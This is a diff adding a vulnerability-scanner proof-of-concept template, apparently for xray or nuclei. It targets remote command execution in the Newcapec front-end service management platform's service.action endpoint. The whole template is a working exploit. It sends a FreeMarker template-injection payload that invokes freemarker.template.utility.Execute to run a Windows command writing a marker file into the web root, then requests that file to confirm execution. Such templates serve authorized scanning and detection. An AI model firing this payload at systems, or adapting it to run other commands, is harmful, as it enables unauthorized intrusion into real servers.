@@ -1,0 +1,23 @@
+id: poc-yaml-xkp-front-end-service-management-platform-service.action-rce
+info:
+  name: 新开普 前置服务管理平台 service.action 远程命令执行漏洞
+  severity: high
+  tags:
+  - rce
+  finger: 新开普 前置服务管理平台
+variables:
+  t1: md5(123)
+requests:
+- raw: 'POST /service_transport/service.action HTTP/1.1
+
+    Content-Type: application/json
+
+
+    {"command":"GetFZinfo","UnitCode":"<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"cmd
+    /c echo {{.t1}} > ./webapps/ROOT/Test.txt\")}"}'
+  expression: status_code == 200 && contains(body,"\"_result\":false") && contains(body,"\"_code\":99")
+    && duration > 5
+- method: GET
+  path: /Test.txt
+  expression: status_code == 200 && contains(body,t1)
+transport: http
